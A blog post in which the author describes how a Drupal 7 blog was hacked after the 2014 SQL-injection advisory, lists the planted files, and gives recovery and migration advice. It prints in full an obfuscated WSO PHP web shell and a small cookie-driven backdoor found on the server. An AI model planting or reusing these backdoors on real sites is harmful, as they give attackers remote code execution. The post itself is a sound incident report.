---
layout: post
title: '#Drupalgate How my Drupal blog was hacked?'
tags:
- drupal
- hackers
- drupal-7
- drupalgate
---

A few days ago Drupal released a [security upgrade](https://www.drupal.org/SA-CORE-2014-005) for Drupal 7. It is a one-line patch for what is the biggest vulnerability in Drupal's history. Just 7 hours after the announcment, websites started to register automated attacks. 

This blog was running Drupal 7 (is not anymore) and I just forgot to upgrade inmediatelly. The worst happened and my website was hacked.

I was using Git to manage the code on my blog, so I inmediatelly knew something was wrong when I saw new and modified files. If you're not using Git, then is going to be harder to detect the hack.

Using git I was able to identify that the following files changed:

    misc/dir.php
    modules/locale/a18h8n.php
    modules/simpletest/tqrp.php
    sites/all/libraries/tinymce/jscripts/tiny_mce/themes/advanced/skins/default/.option72.php
    sites/all/modules/media/templates/global97.php
    sites/all/modules/media_vimeo/includes/help.php
    sites/all/modules/metatag/metatag_opengraph/.login.php
    sites/all/modules/oauth/includes/footer.php
    sites/all/modules/views/modules/user/.inc76.php


If you know Drupal, you know inmediatelly that something is just plain wrong. It was even more obvious after I inspected some of the files:

		$ cat modules/locale/a18h8n.php
        <?php ${"\x47LOB\x41\x4c\x53"}["\x76\x72vw\x65y\x70\x7an\x69\x70\x75"]="a";${"\x47\x4cOBAL\x53"}["\x67\x72\x69u\x65\x66\x62\x64\x71c"]="\x61\x75\x74h\x5fpas\x73";${"\x47\x4cOBAL\x53"}["\x63\x74xv\x74\x6f\x6f\x6bn\x6dju"]="\x76";${"\x47\x4cO\x42A\x4cS"}["p\x69\x6fykc\x65\x61"]="def\x61ul\x74\x5fu\x73\x65_\x61j\x61\x78";${"\x47\x4c\x4f\x42\x41\x4c\x53"}["i\x77i\x72\x6d\x78l\x71tv\x79p"]="defa\x75\x6c\x74\x5f\x61\x63t\x69\x6f\x6e";${"\x47L\x4fB\x41\x4cS"}["\x64\x77e\x6d\x62\x6a\x63"]="\x63\x6fl\x6f\x72";${${"\x47\x4c\x4f\x42\x41LS"}["\x64\x77\x65\x6dbj\x63"]}="\x23d\x665";${${"\x47L\x4fB\x41\x4c\x53"}["\x69\x77\x69rm\x78\x6c\x71\x74\x76\x79p"]}="\x46i\x6cesM\x61n";$oboikuury="\x64e\x66a\x75\x6ct\x5fc\x68\x61\x72\x73\x65t";${${"\x47L\x4f\x42\x41\x4cS"}["p\x69oy\x6bc\x65\x61"]}=true;${$oboikuury}="\x57indow\x73-1\x325\x31";@ini_set("\x65r\x72o\x72_\x6cog",NULL);@ini_set("l\x6fg_er\x72ors",0);@ini_set("max_ex\x65\x63\x75\x74\x69o\x6e\x5f\x74im\x65",0);@set_time_limit(0);@set_magic_quotes_runtime(0);@define("WS\x4f\x5fVE\x52S\x49ON","\x32.5\x2e1");if(get_magic_quotes_gpc()){function WSOstripslashes($array){${"\x47\x4c\x4f\x42A\x4c\x53"}["\x7a\x64\x69z\x62\x73\x75e\x66a"]="\x61\x72r\x61\x79";$cfnrvu="\x61r\x72a\x79";${"GLOB\x41L\x53"}["\x6b\x63\x6ct\x6c\x70\x64\x73"]="a\x72\x72\x61\x79";return is_array(${${"\x47\x4cO\x42\x41\x4c\x53"}["\x7ad\x69\x7ab\x73\x75e\x66\x61"]})?array_map("\x57SOst\x72\x69\x70\x73\x6c\x61\x73\x68\x65s",${${"\x47\x4cO\x42\x41LS"}["\x6b\x63\x6c\x74l\x70\x64\x73"]}):stripslashes(${$cfnrvu});}$_POST=WSOstripslashes($_POST);$_COOKIE=WSOstripslashes($_COOKIE);}function wsoLogin(){header("\x48\x54TP/1.\x30\x204\x30\x34\x20\x4eo\x74 \x46ound");die("4\x304");}function WSOsetcookie($k,$v){${"\x47\x4cO\x42ALS"}["\x67vf\x6c\x78m\x74"]="\x6b";$cjtmrt="\x76";$_COOKIE[${${"G\x4c\x4f\x42\x41LS"}["\x67\x76\x66\x6cxm\x74"]}]=${${"GLO\x42\x41\x4cS"}["\x63\x74\x78\x76t\x6f\x6fknm\x6a\x75"]};$raogrsixpi="\x6b";setcookie(${$raogrsixpi},${$cjtmrt});}$qyvsdolpq="a\x75\x74\x68\x5f\x70\x61s\x73";if(!empty(${$qyvsdolpq})){$rhavvlolc="au\x74h_\x70a\x73\x73";$ssfmrro="a\x75t\x68\x5fpa\x73\x73";if(isset($_POST["p\x61ss"])&&(md5($_POST["pa\x73\x73"])==${$ssfmrro}))WSOsetcookie(md5($_SERVER["H\x54\x54P_\x48\x4f\x53T"]),${${"\x47L\x4f\x42\x41\x4c\x53"}["\x67\x72\x69\x75e\x66b\x64\x71\x63"]});if(!isset($_COOKIE[md5($_SERVER["\x48T\x54\x50\x5f\x48O\x53\x54"])])||($_COOKIE[md5($_SERVER["H\x54\x54\x50_H\x4fST"])]!=${$rhavvlolc}))wsoLogin();}function actionRC(){if(!@$_POST["p\x31"]){$ugtfpiyrum="a";${${"\x47\x4c\x4fB\x41LS"}["\x76r\x76w\x65\x79\x70z\x6eipu"]}=array("\x75n\x61m\x65"=>php_uname(),"p\x68\x70\x5fver\x73\x69o\x6e"=>phpversion(),"\x77s\x6f_v\x65\x72si\x6f\x6e"=>WSO_VERSION,"saf\x65m\x6f\x64e"=>@ini_get("\x73\x61\x66\x65\x5fm\x6fd\x65"));echo serialize(${$ugtfpiyrum});}else{eval($_POST["\x70\x31"]);}}if(empty($_POST["\x61"])){${"\x47L\x4fB\x41LS"}["\x69s\x76\x65\x78\x79"]="\x64\x65\x66\x61\x75\x6ct\x5f\x61c\x74i\x6f\x6e";${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x75\x6f\x65c\x68\x79\x6d\x7ad\x64\x64"]="\x64\x65\x66a\x75\x6c\x74_\x61\x63\x74\x69\x6fn";if(isset(${${"\x47L\x4f\x42\x41LS"}["\x69\x77ir\x6d\x78lqtv\x79\x70"]})&&function_exists("\x61ct\x69\x6f\x6e".${${"\x47L\x4f\x42\x41\x4cS"}["\x75o\x65ch\x79\x6d\x7a\x64\x64\x64"]}))$_POST["a"]=${${"\x47\x4c\x4f\x42ALS"}["i\x73\x76e\x78\x79"]};else$_POST["a"]="\x53e\x63\x49\x6e\x66o";}if(!empty($_POST["\x61"])&&function_exists("actio\x6e".$_POST["\x61"]))call_user_func("\x61\x63\x74\x69\x6f\x6e".$_POST["a"]);exit;

I don't know what that file is doing, but I'm 100% sure is not a good thing.

Other files looked like this:

	$ cat modules/simpletest/tqrp.php
    <?php $form1=@$_COOKIE["Kcqf3"]; if ($form1){ $opt=$form1(@$_COOKIE["Kcqf2"]); $au=$form1(@$_COOKIE["Kcqf1"]); $opt("/292/e",$au,292); } phpinfo();
    
Again, that's not good.

###### What to do?

The Drupal Security Team recommends a series of steps to take. First, they tell you that you should assume that you were hacked if you didn't upgrade on time. Second, they recommend that you to turn off the website and recreate it by restoring a backup of your database and your files. If you're running Drupal 7, and you haven't read the Security Announcement, you should read it ASAP https://www.drupal.org/PSA-2014-003

I saw this as an oportunity to migrate from Drupal to another platform because I'm tired of maintaining my blog so I decided to give Ghost.io a chance.

After dumping the database, I uploaded the database to my local machine and I created a module that exports all content to a JSON file that I used to upload everything to Ghost.io. Creating and debugging the module took about 2 hours and uploading the file took only a few seconds.

I'm [releasing](https://github.com/luiselizondo/drupal-to-ghost) the module as Open Source in case you want to migrate your site to Ghost. The module is not something that you can just install and use, you'll probabbly want to configure and tweek some things, and it only allows you to export one content type. Ghost.io is just a blogging platform so it may not be an option to you.

###### Recommendations
If you have any doubts or you don't know if you were victim of #Drupalgate, I recommend that you look for the files I mentioned earlier. The database might be compromised too but in my case, I didn't find anything to suggest that it was.

If you're not using Git, you should. It literally took me 2 seconds to realise my blog was hacked because Git tells you what files changed since your last commit.

Finally, if you use the same password on your Drupal site and somewhere else, change it, is very likelly that is is compromised.